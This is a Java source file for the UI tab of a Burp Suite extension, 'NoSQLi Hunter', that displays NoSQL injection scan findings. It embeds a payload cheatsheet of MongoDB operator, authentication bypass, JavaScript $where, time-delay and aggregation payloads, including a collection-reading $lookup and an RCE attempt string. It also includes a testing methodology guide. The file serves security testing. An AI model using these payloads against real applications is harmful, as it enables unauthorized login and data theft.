package nosqli;

import burp.api.montoya.MontoyaApi;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.StringSelection;

/**
 * NoSQLiTab — Burp Suite UI Tab (Redesigned)
 *
 * التحسينات:
 *  - الـ Live Log متوصّلة بـ FindingsLogger المشترك → بيظهر فيها كل حاجة من أي مكان
 *  - Findings Table بتعرض: Technique | Severity | Param | Payload | Evidence | URL | Full Request
 *  - زر Copy بيشتغل صح على كل عمود
 *  - زر "Show Full Request" بيفتح popup بالـ HTTP request كامل مع الـ payload
 */
public class NoSQLiTab {

    private final MontoyaApi api;
    private final JPanel mainPanel;

    // Live log
    private final JTextArea logArea = new JTextArea();

    // Findings table
    private final String[] FINDING_COLS = {
        "#", "Time", "Technique", "Severity", "Parameter", "Payload", "Evidence", "URL"
    };
    private final DefaultTableModel findingsModel = new DefaultTableModel(FINDING_COLS, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };

    // Store full requests separately (parallel to table rows)
    private final java.util.List<String> fullRequests  = new java.util.ArrayList<>();
    private final java.util.List<String> fullUrlPaths  = new java.util.ArrayList<>();

    public NoSQLiTab(MontoyaApi api) {
        this.api = api;
        this.mainPanel = new JPanel(new BorderLayout(5, 5));
        buildUI();
        hookLogger();
    }

    public Component getComponent() { return mainPanel; }

    // ─────────────────────────────────────────────────────────────
    // HOOK FindingsLogger
    // ─────────────────────────────────────────────────────────────

    private void hookLogger() {
        FindingsLogger flog = FindingsLogger.getInstance();

        // لوج نصي → يظهر في logArea
        flog.addLogListener(line -> {
            logArea.append(line);
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });

        // Finding جديد → يُضاف في الجدول
        flog.addFindingListener(f -> {
            int rowNum = findingsModel.getRowCount() + 1;
            findingsModel.addRow(new Object[]{
                rowNum,
                f.timestamp,
                f.technique,
                f.severity,
                f.parameter,
                f.payload,
                f.evidence,
                f.url
            });
            fullRequests.add(f.fullRequest != null ? f.fullRequest : "");
            fullUrlPaths.add(f.urlPath    != null ? f.urlPath     : "");
        });
    }

    // ─────────────────────────────────────────────────────────────
    // UI BUILD
    // ─────────────────────────────────────────────────────────────

    private void buildUI() {
        mainPanel.setBackground(new Color(30, 35, 45));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        mainPanel.add(buildHeader(), BorderLayout.NORTH);

        // Main center: tabbed pane
        JTabbedPane centerTabs = new JTabbedPane();
        centerTabs.setBackground(new Color(30, 35, 45));
        centerTabs.setForeground(Color.WHITE);

        centerTabs.addTab("📊 Live Findings",    buildFindingsPanel());
        centerTabs.addTab("📜 Live Log",          buildLogPanel());
        centerTabs.addTab("📋 Payload Cheatsheet", buildPayloadCheatsheet());
        centerTabs.addTab("📖 Methodology Guide",  buildGuidePanel());

        mainPanel.add(centerTabs, BorderLayout.CENTER);
        mainPanel.add(buildConfigPanel(), BorderLayout.SOUTH);
    }

    // ─── Header ───────────────────────────────────────────────────

    private JPanel buildHeader() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBackground(new Color(20, 25, 35));
        panel.setBorder(BorderFactory.createEmptyBorder(8, 12, 8, 12));

        JLabel title = new JLabel("🔍 NoSQLi Hunter v" + NoSQLiScanner.VERSION);
        title.setFont(new Font("Monospaced", Font.BOLD, 20));
        title.setForeground(new Color(50, 200, 100));

        JLabel subtitle = new JLabel(
            "  MongoDB · CouchDB · Operator Injection · JS Injection · Blind Boolean · " +
            "Time-Based · Auth Bypass · Content-Type Confusion · Mongoose CVE-2025-23061"
        );
        subtitle.setFont(new Font("SansSerif", Font.PLAIN, 13));
        subtitle.setForeground(new Color(150, 180, 220));

        JPanel titlePanel = new JPanel(new BorderLayout());
        titlePanel.setBackground(new Color(20, 25, 35));
        titlePanel.add(title, BorderLayout.NORTH);
        titlePanel.add(subtitle, BorderLayout.SOUTH);

        JLabel status = new JLabel("  ● ACTIVE");
        status.setFont(new Font("Monospaced", Font.BOLD, 13));
        status.setForeground(new Color(50, 220, 80));

        panel.add(titlePanel, BorderLayout.CENTER);
        panel.add(status, BorderLayout.EAST);
        return panel;
    }

    // ─── Findings Panel ───────────────────────────────────────────

    private JPanel buildFindingsPanel() {
        JPanel panel = new JPanel(new BorderLayout(5, 5));
        panel.setBackground(new Color(25, 30, 40));

        // Table
        JTable table = new JTable(findingsModel);
        table.setBackground(new Color(20, 25, 35));
        table.setForeground(new Color(200, 230, 255));
        table.setSelectionBackground(new Color(50, 90, 140));
        table.setFont(new Font("Monospaced", Font.PLAIN, 13));
        table.getTableHeader().setBackground(new Color(35, 45, 60));
        table.getTableHeader().setForeground(new Color(100, 200, 100));
        table.setRowHeight(26);
        table.setGridColor(new Color(50, 60, 75));

        // Column widths
        int[] widths = {35, 70, 150, 80, 120, 220, 220, 280};
        for (int i = 0; i < widths.length; i++) {
            table.getColumnModel().getColumn(i).setPreferredWidth(widths[i]);
        }

        // Severity color renderer
        table.setDefaultRenderer(Object.class, (tbl, value, isSelected, hasFocus, row, col) -> {
            JLabel label = new JLabel(value != null ? value.toString() : "");
            label.setOpaque(true);
            label.setFont(new Font("Monospaced", Font.PLAIN, 13));

            if (isSelected) {
                label.setBackground(new Color(50, 90, 140));
                label.setForeground(Color.WHITE);
            } else {
                // Color by severity
                String sev = findingsModel.getValueAt(row, 3) != null
                    ? findingsModel.getValueAt(row, 3).toString() : "";
                Color bg = switch (sev) {
                    case "CRITICAL" -> new Color(80, 20, 20);
                    case "HIGH"     -> new Color(60, 30, 10);
                    case "MEDIUM"   -> new Color(40, 40, 10);
                    default         -> new Color(20, 25, 35);
                };
                label.setBackground(bg);
                label.setForeground(new Color(200, 230, 255));
            }
            return label;
        });

        JScrollPane scroll = new JScrollPane(table);
        scroll.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(new Color(50, 200, 100)),
            "Findings (click row → Show Full Request)",
            TitledBorder.LEFT, TitledBorder.TOP,
            new Font("Monospaced", Font.BOLD, 13),
            new Color(50, 200, 100)
        ));
        panel.add(scroll, BorderLayout.CENTER);

        // Buttons row
        JPanel btns = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        btns.setBackground(new Color(25, 30, 40));

        JButton btnShowReq = darkButton("🔍 Show Full Request");
        JButton btnCopyPayload = darkButton("📋 Copy Payload");
        JButton btnCopyUrl = darkButton("🔗 Copy URL");
        JButton btnClear = darkButton("🗑️ Clear Findings");
        JButton btnExport = darkButton("💾 Export Findings");

        btnShowReq.addActionListener(e -> {
            int row = table.getSelectedRow();
            if (row < 0) { showInfo("Select a finding row first."); return; }
            String fullReq = row < fullRequests.size() ? fullRequests.get(row) : "N/A";
            String path    = row < fullUrlPaths.size()  ? fullUrlPaths.get(row)  : "";
            showFullRequest(
                (String) findingsModel.getValueAt(row, 2),
                (String) findingsModel.getValueAt(row, 4),
                (String) findingsModel.getValueAt(row, 5),
                fullReq, path
            );
        });

        btnCopyPayload.addActionListener(e -> {
            int row = table.getSelectedRow();
            if (row < 0) return;
            copyToClipboard((String) findingsModel.getValueAt(row, 5));
        });

        btnCopyUrl.addActionListener(e -> {
            int row = table.getSelectedRow();
            if (row < 0) return;
            copyToClipboard((String) findingsModel.getValueAt(row, 7));
        });

        btnClear.addActionListener(e -> {
            findingsModel.setRowCount(0);
            fullRequests.clear();
            fullUrlPaths.clear();
            FindingsLogger.getInstance().clearFindings();
        });

        btnExport.addActionListener(e -> exportFindings());

        // Double-click = show full request
        table.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent ev) {
                if (ev.getClickCount() == 2) {
                    int row = table.getSelectedRow();
                    if (row >= 0) {
                        String fullReq = row < fullRequests.size() ? fullRequests.get(row) : "N/A";
                        String path    = row < fullUrlPaths.size()  ? fullUrlPaths.get(row)  : "";
                        showFullRequest(
                            (String) findingsModel.getValueAt(row, 2),
                            (String) findingsModel.getValueAt(row, 4),
                            (String) findingsModel.getValueAt(row, 5),
                            fullReq, path
                        );
                    }
                }
                // Right-click → copy cell
                if (SwingUtilities.isRightMouseButton(ev)) {
                    int row = table.rowAtPoint(ev.getPoint());
                    int col = table.columnAtPoint(ev.getPoint());
                    if (row >= 0 && col >= 0) {
                        Object val = table.getValueAt(row, col);
                        if (val != null) copyToClipboard(val.toString());
                    }
                }
            }
        });

        btns.add(btnShowReq);
        btns.add(btnCopyPayload);
        btns.add(btnCopyUrl);
        btns.add(btnClear);
        btns.add(btnExport);
        panel.add(btns, BorderLayout.SOUTH);

        return panel;
    }

    /** Popup window shows the full HTTP request with payload highlighted */
    private void showFullRequest(String technique, String param, String payload,
                                  String fullRequest, String redirectPath) {
        JDialog dialog = new JDialog((Frame) null, "Full HTTP Request — " + technique + " / " + param, false);
        dialog.setSize(900, 600);
        dialog.setLocationRelativeTo(null);

        JPanel dp = new JPanel(new BorderLayout(5, 5));
        dp.setBackground(new Color(20, 25, 35));

        // Plain text: HTML markup renders as literal text inside Burp's UI
        JLabel info = new JLabel(
            "Technique: " + technique + "    Parameter: " + param +
            "    Payload: " + truncate(payload, 80) +
            (redirectPath.isEmpty() ? "" : "    Redirect→ " + redirectPath)
        );
        info.setFont(new Font("SansSerif", Font.BOLD, 13));
        info.setForeground(new Color(80, 200, 100));
        info.setBorder(BorderFactory.createEmptyBorder(6, 10, 6, 10));
        dp.add(info, BorderLayout.NORTH);

        JTextArea reqArea = new JTextArea(fullRequest);
        reqArea.setEditable(false);
        reqArea.setBackground(new Color(15, 20, 30));
        reqArea.setForeground(new Color(180, 255, 180));
        reqArea.setFont(new Font("Monospaced", Font.PLAIN, 14));
        reqArea.setCaretPosition(0);
        dp.add(new JScrollPane(reqArea), BorderLayout.CENTER);

        JPanel btnRow = new JPanel(new FlowLayout(FlowLayout.RIGHT));
        btnRow.setBackground(new Color(20, 25, 35));
        JButton copyBtn = darkButton("📋 Copy Full Request");
        copyBtn.addActionListener(e -> copyToClipboard(fullRequest));
        JButton closeBtn = darkButton("Close");
        closeBtn.addActionListener(e -> dialog.dispose());
        btnRow.add(copyBtn);
        btnRow.add(closeBtn);
        dp.add(btnRow, BorderLayout.SOUTH);

        dialog.setContentPane(dp);
        dialog.setVisible(true);
    }

    // ─── Log Panel ────────────────────────────────────────────────

    private JScrollPane buildLogPanel() {
        logArea.setEditable(false);
        logArea.setBackground(new Color(15, 20, 30));
        logArea.setForeground(new Color(180, 255, 180));
        logArea.setFont(new Font("Monospaced", Font.PLAIN, 13));
        logArea.setText("[NoSQLi Hunter] Ready — use right-click menu or active scan.\n");

        JScrollPane sp = new JScrollPane(logArea);
        sp.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(new Color(100, 200, 100)),
            "Live Log (all scan activity)",
            TitledBorder.LEFT, TitledBorder.TOP,
            new Font("Monospaced", Font.BOLD, 13),
            new Color(100, 200, 100)
        ));

        // Add clear button inside a wrapper
        JPanel wrapper = new JPanel(new BorderLayout());
        wrapper.setBackground(new Color(15, 20, 30));
        wrapper.add(sp, BorderLayout.CENTER);
        JPanel logBtns = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 3));
        logBtns.setBackground(new Color(15, 20, 30));
        JButton clearLog = darkButton("🗑️ Clear Log");
        clearLog.addActionListener(e -> logArea.setText(""));
        JButton copyLog = darkButton("📋 Copy Log");
        copyLog.addActionListener(e -> copyToClipboard(logArea.getText()));
        logBtns.add(clearLog);
        logBtns.add(copyLog);
        wrapper.add(logBtns, BorderLayout.SOUTH);

        // Return the JScrollPane as a tab component
        JPanel p = new JPanel(new BorderLayout());
        p.setBackground(new Color(15, 20, 30));
        p.add(sp, BorderLayout.CENTER);
        p.add(logBtns, BorderLayout.SOUTH);
        return new JScrollPane(p) {{
            setBorder(null);
        }};
    }

    // ─── Payload Cheatsheet ───────────────────────────────────────

    private JScrollPane buildPayloadCheatsheet() {
        JTabbedPane tabs = new JTabbedPane();
        tabs.setBackground(new Color(40, 45, 55));
        tabs.setForeground(Color.WHITE);

        tabs.addTab("Operators",   buildTableWithCopy(
            new String[]{"Operator","URL-Encoded","JSON","Description"},
            new Object[][]{
                {"$ne",    "param[$ne]=x",       "{\"param\":{\"$ne\":\"x\"}}",       "Not equal — auth bypass"},
                {"$gt",    "param[$gt]=",         "{\"param\":{\"$gt\":\"\"}}",         "Greater than empty"},
                {"$lt",    "param[$lt]=~~~~~",    "{\"param\":{\"$lt\":\"~~~~~\"}}",    "Less than — false cond"},
                {"$gte",   "param[$gte]=",        "{\"param\":{\"$gte\":\"\"}}",        "Greater or equal"},
                {"$lte",   "param[$lte]=",        "{\"param\":{\"$lte\":\"\"}}",        "Less or equal"},
                {"$regex", "param[$regex]=.*",    "{\"param\":{\"$regex\":\".*\"}}",    "Match all — bypass"},
                {"$in",    "param[$in][]=x",      "{\"param\":{\"$in\":[\"x\"]}}",      "In array"},
                {"$nin",   "param[$nin][]=x",     "{\"param\":{\"$nin\":[\"x\"]}}",     "Not in array"},
                {"$exists","param[$exists]=true", "{\"param\":{\"$exists\":true}}",     "Field exists"},
                {"$type",  "param[$type]=2",      "{\"param\":{\"$type\":2}}",          "BSON type 2=string"},
                {"$where", "N/A",                 "{\"$where\":\"1==1\"}",              "JS expression eval"},
                {"$or",    "N/A",                 "{\"$or\":[{\"a\":1}]}",              "Logical OR"},
                {"$and",   "N/A",                 "{\"$and\":[{\"a\":1}]}",             "Logical AND"},
            }
        ));

        tabs.addTab("Auth Bypass", buildTableWithCopy(
            new String[]{"Type","Payload","Effect"},
            new Object[][]{
                {"URL-Enc","user[$ne]=x&pass[$ne]=x",                     "Bypass with $ne on both"},
                {"URL-Enc","user[$gt]=&pass[$gt]=",                       "Greater-than empty string"},
                {"URL-Enc","user[$regex]=.*&pass[$ne]=x",                  "Regex match all usernames"},
                {"URL-Enc","user[$in][]=admin&pass[$ne]=x",               "Try common usernames"},
                {"URL-Enc","user[$exists]=true&pass[$gt]=",               "Both fields exist"},
                {"JSON",   "{\"u\":{\"$ne\":null},\"p\":{\"$ne\":null}}",  "Null bypass"},
                {"JSON",   "{\"u\":{\"$gt\":\"\"},\"p\":{\"$gt\":\"\"}}",  "GT empty string"},
                {"JSON",   "{\"u\":{\"$regex\":\".*\"},\"p\":{\"$ne\":\"\"}}","Regex all"},
                {"JSON",   "{\"u\":\"admin\",\"p\":{\"$ne\":\"wrong\"}}",  "Known user bypass"},
                {"JSON",   "{\"$or\":[{\"$where\":\"1==1\"}]}",            "CVE-2025-23061 Mongoose"},
            }
        ));

        tabs.addTab("JS / $where", buildTableWithCopy(
            new String[]{"Context","Payload (TRUE)","Payload (FALSE)"},
            new Object[][]{
                {"URL param",  "' || '1'=='1",               "' || '1'=='2"},
                {"URL param",  "'; return true; var x='",    "'; return false; var x='"},
                {"GET param",  "' && this.x.match(/.*/)",    "' && this.x.match(/^IMPOSSIBLE$/)"},
                {"$where key", "1==1",                        "1==2"},
                {"SSJS Delay", "';var t=new Date();do{}while(new Date()-t<3000);var x='","SAFE delay 3s"},
                {"$function",  "{\"$function\":{\"body\":\"return true\",\"args\":[],\"lang\":\"js\"}}","N/A"},
            }
        ));

        tabs.addTab("Aggregation", buildTableWithCopy(
            new String[]{"Pipeline Op","JSON Payload","Effect"},
            new Object[][]{
                {"$lookup", "{\"$lookup\":{\"from\":\"users\",\"localField\":\"_id\",\"foreignField\":\"_id\",\"as\":\"leaked\"}}", "Read other collection"},
                {"$unionWith","{\"$unionWith\":{\"coll\":\"users\",\"pipeline\":[]}}",                                               "Merge users collection"},
                {"$out",    "{\"$out\":\"nosqli_test\"}",                                                                            "Write to another col"},
                {"$where",  "{\"$where\":\"global.process.mainModule.require\"}",                                                    "RCE attempt"},
            }
        ));

        JScrollPane sp = new JScrollPane(tabs);
        sp.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(new Color(50, 200, 100)),
            "Payload Reference (right-click any cell to copy)",
            TitledBorder.LEFT, TitledBorder.TOP,
            new Font("Monospaced", Font.BOLD, 13),
            new Color(50, 200, 100)
        ));
        return sp;
    }

    /** Table with right-click copy on any cell */
    private JTable buildTableWithCopy(String[] cols, Object[][] data) {
        DefaultTableModel model = new DefaultTableModel(data, cols) {
            @Override public boolean isCellEditable(int r, int c) { return false; }
        };
        JTable table = new JTable(model);
        table.setBackground(new Color(25, 30, 40));
        table.setForeground(new Color(200, 230, 255));
        table.setSelectionBackground(new Color(50, 80, 120));
        table.setFont(new Font("Monospaced", Font.PLAIN, 13));
        table.getTableHeader().setBackground(new Color(35, 45, 60));
        table.getTableHeader().setForeground(new Color(100, 200, 100));
        table.setRowHeight(27);
        table.setGridColor(new Color(50, 60, 75));

        // Right-click → copy cell
        table.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent ev) {
                int row = table.rowAtPoint(ev.getPoint());
                int col = table.columnAtPoint(ev.getPoint());
                if (row >= 0 && col >= 0) {
                    // always select the row
                    table.setRowSelectionInterval(row, row);
                    if (SwingUtilities.isRightMouseButton(ev)) {
                        Object val = table.getValueAt(row, col);
                        if (val != null) {
                            copyToClipboard(val.toString());
                            JOptionPane.showMessageDialog(table, "Copied: " + val, "Copied", JOptionPane.INFORMATION_MESSAGE);
                        }
                    }
                }
            }
        });
        return table;
    }

    // ─── Guide Panel ──────────────────────────────────────────────

    private JPanel buildGuidePanel() {
        JTextArea guide = new JTextArea();
        guide.setEditable(false);
        guide.setBackground(new Color(25, 30, 40));
        guide.setForeground(new Color(200, 220, 255));
        guide.setFont(new Font("Monospaced", Font.PLAIN, 13));
        guide.setText(
            "╔════════════════════════════════════════════════════════════╗\n" +
            "║          NoSQLi Hunter — Testing Methodology               ║\n" +
            "╠════════════════════════════════════════════════════════════╣\n" +
            "║                                                            ║\n" +
            "║  STEP 1: IDENTIFY BODY TYPE                                ║\n" +
            "║  • JSON:        application/json body                      ║\n" +
            "║  • URL-Encoded: application/x-www-form-urlencoded          ║\n" +
            "║  • GET Params:  query string (?user=admin)                 ║\n" +
            "║  • GraphQL:     JSON with 'query' field                    ║\n" +
            "║                                                            ║\n" +
            "║  STEP 2: ERROR DETECTION (Fastest, Highest Confidence)     ║\n" +
            "║  • Inject: ' \" \\ ; { } $ null undefined                ║\n" +
            "║  • Look for: MongoError, CastError, BSONTypeError          ║\n" +
            "║  • CONFIRMED if error appears ONLY after injection         ║\n" +
            "║                                                            ║\n" +
            "║  STEP 3: BLIND BOOLEAN (Anti-FP: 2 pairs required)         ║\n" +
            "║  • TRUE payload  → observe response                        ║\n" +
            "║  • FALSE payload → compare response                        ║\n" +
            "║  • Detects: size diff >15%, status change,                 ║\n" +
            "║             URL path change (redirect), body content       ║\n" +
            "║  • CONFIRMED if 2+ payload pairs agree                     ║\n" +
            "║                                                            ║\n" +
            "║  STEP 4: AUTH DETECTION (Content + Path based)             ║\n" +
            "║  • Checks redirect URL path for dashboard/profile/admin    ║\n" +
            "║  • Checks body for success keywords: dashboard, welcome    ║\n" +
            "║  • Checks body for failure keywords disappearing           ║\n" +
            "║  • NOT just status code change                             ║\n" +
            "║                                                            ║\n" +
            "║  STEP 5: TIME-BASED (Last resort, JS eval only)            ║\n" +
            "║  • Baseline = avg(3 samples)                               ║\n" +
            "║  • Inject JS delay: do{}while(new Date()-t<3000)           ║\n" +
            "║  • CONFIRMED if elapsed > baseline×2.5 AND 2× verified    ║\n" +
            "║                                                            ║\n" +
            "║  FINDINGS TABLE                                            ║\n" +
            "║  • Double-click any row → see FULL HTTP request            ║\n" +
            "║  • Right-click any cell → copy value                       ║\n" +
            "║  • Full request includes all headers + injected body       ║\n" +
            "║                                                            ║\n" +
            "║  CVE REFERENCES:                                           ║\n" +
            "║  • CVE-2025-23061  Mongoose $where bypass via $or         ║\n" +
            "║  • CAPEC-676       NoSQL Injection                         ║\n" +
            "║  • CWE-943         Improper Neutralization                 ║\n" +
            "╚════════════════════════════════════════════════════════════╝\n"
        );

        JPanel p = new JPanel(new BorderLayout());
        p.setBackground(new Color(25, 30, 40));
        p.add(new JScrollPane(guide), BorderLayout.CENTER);
        return p;
    }

    // ─── Config Panel ─────────────────────────────────────────────

    private JPanel buildConfigPanel() {
        JPanel panel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 4));
        panel.setBackground(new Color(25, 30, 40));
        panel.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(new Color(80, 80, 120)),
            "Configuration",
            TitledBorder.LEFT, TitledBorder.TOP,
            new Font("SansSerif", Font.BOLD, 12),
            new Color(150, 160, 200)
        ));

        JLabel info = new JLabel(
            "  Boolean Diff: 15%  |  Time Threshold: 2500ms  |  Confirmations: 2  |  " +
            "Auth Detection: Content + URL Path  |  " +
            "Right-click requests for manual testing  |  Active scan auto-tests all params"
        );
        info.setForeground(new Color(140, 160, 200));
        info.setFont(new Font("SansSerif", Font.PLAIN, 12));
        panel.add(info);
        return panel;
    }

    // ─── Utilities ────────────────────────────────────────────────

    private JButton darkButton(String text) {
        JButton b = new JButton(text);
        b.setBackground(new Color(40, 50, 70));
        b.setForeground(new Color(180, 210, 255));
        b.setFont(new Font("SansSerif", Font.PLAIN, 13));
        b.setFocusPainted(false);
        b.setBorder(BorderFactory.createLineBorder(new Color(70, 80, 110)));
        return b;
    }

    private void copyToClipboard(String text) {
        if (text == null || text.isEmpty()) return;
        Toolkit.getDefaultToolkit().getSystemClipboard()
            .setContents(new StringSelection(text), null);
    }

    private void showInfo(String msg) {
        JOptionPane.showMessageDialog(mainPanel, msg, "NoSQLi Hunter", JOptionPane.INFORMATION_MESSAGE);
    }

    private void exportFindings() {
        StringBuilder sb = new StringBuilder();
        sb.append("NoSQLi Hunter — Findings Export\n");
        sb.append("Generated: ").append(java.time.LocalDateTime.now()).append("\n\n");

        for (FindingsLogger.Finding f : FindingsLogger.getInstance().getFindings()) {
            sb.append("════════════════════════════════\n");
            sb.append("Time:      ").append(f.timestamp).append("\n");
            sb.append("Technique: ").append(f.technique).append("\n");
            sb.append("Severity:  ").append(f.severity).append("\n");
            sb.append("URL:       ").append(f.url).append("\n");
            sb.append("Parameter: ").append(f.parameter).append("\n");
            sb.append("Payload:   ").append(f.payload).append("\n");
            sb.append("Evidence:  ").append(f.evidence).append("\n");
            if (f.urlPath != null && !f.urlPath.isEmpty())
                sb.append("Redirect:  ").append(f.urlPath).append("\n");
            sb.append("\n--- FULL HTTP REQUEST ---\n");
            sb.append(f.fullRequest).append("\n\n");
        }

        copyToClipboard(sb.toString());
        showInfo("Findings exported to clipboard (" +
            FindingsLogger.getInstance().getFindings().size() + " findings)");
    }

    private String esc(String s) {
        if (s == null) return "";
        return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
